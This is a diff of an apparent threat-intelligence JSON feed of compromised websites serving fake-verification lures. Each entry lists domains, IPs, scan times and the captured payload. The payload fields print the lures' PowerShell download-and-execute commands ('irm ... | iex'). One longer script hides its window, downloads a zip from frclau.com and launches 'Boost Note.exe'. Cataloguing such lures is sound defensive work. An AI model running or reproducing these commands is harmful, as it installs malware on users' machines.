@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "nmengineering.co.za",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/click/41422c4edd1735b5"
+    ],
+    "IP": [
+      "102.130.117.48"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/click/41422c4edd1735b5')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/click/41422c4edd1735b5"
+    ],
+    "ReportId": "cmwfqf7a40ivv0oml8u89k1od",
+    "ScannedAt": "2026-11-14T01:33:36.554000+00:00"
+  },
+  {
     "UrlDomain": "www.mediweld.com",
     "DeliveryUrl": [
       "browse-cloud.codes"
@@ -5333,180 +5352,5 @@
     ],
     "ReportId": "cmwbi0g9507kw0nmljk124v3m",
     "ScannedAt": "2026-11-11T02:27:06.700000+00:00"
-  },
-  {
-    "UrlDomain": "nguyenvanhoafood.com",
-    "DeliveryUrl": [
-      "t-trustresnew.com"
-    ],
-    "PayloadUrl": [
-      "https://t-trustresnew.com/Girya/3a8b7746765169c8"
-    ],
-    "IP": [
-      "45.124.85.55"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/3a8b7746765169c8')|iex",
-    "ResolvedDownloadUrl": [
-      "https://t-trustresnew.com/Girya/3a8b7746765169c8"
-    ],
-    "ReportId": "cmwbh3b4i077j0nmlsxo3diav",
-    "ScannedAt": "2026-11-11T02:01:20.426000+00:00"
-  },
-  {
-    "UrlDomain": "www.duomoregina.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "89.46.106.49"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589"
-    ],
-    "ReportId": "cmwbh2fwd076j0nml0aa48cic",
-    "ScannedAt": "2026-11-11T02:00:39.970000+00:00"
-  },
-  {
-    "UrlDomain": "slow-work.eu",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "67.205.42.17"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/eda44de7cd33aa18",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/eda44de7cd33aa18'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/eda44de7cd33aa18"
-    ],
-    "ReportId": "cmwbh1u7y075t0nmludx2sjsg",
-    "ScannedAt": "2026-11-11T02:00:11.861000+00:00"
-  },
-  {
-    "UrlDomain": "rafaelalcala.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "173.236.242.255"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
-    ],
-    "ReportId": "cmwbgmb0b071b0nmliw209stc",
-    "ScannedAt": "2026-11-11T01:48:07.150000+00:00"
-  },
-  {
-    "UrlDomain": "serengetifrontier.co.tz",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.53.91"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmwbgl81k070e0nmliamdcqj4",
-    "ScannedAt": "2026-11-11T01:47:16.660000+00:00"
-  },
-  {
-    "UrlDomain": "www.istanbulsaatalanyerler.com",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "94.138.202.5"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwbg605706uo0nmla9szl8z1",
-    "ScannedAt": "2026-11-11T01:35:26.546000+00:00"
-  },
-  {
-    "UrlDomain": "apcon.pk",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "203.128.6.21"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
-    ],
-    "ReportId": "cmwbg59yh06tg0nml07fhq0z2",
-    "ScannedAt": "2026-11-11T01:34:52.586000+00:00"
-  },
-  {
-    "UrlDomain": "iorea.ch",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "82.25.113.158"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwbg2vgl06s20nml1ro6c79z",
-    "ScannedAt": "2026-11-11T01:33:00.521000+00:00"
-  },
-  {
-    "UrlDomain": "bilalindustries.com",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "62.72.52.147"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwbg1jw206qq0nmlz0huek8f",
-    "ScannedAt": "2026-11-11T01:31:58.863000+00:00"
   }
 ]
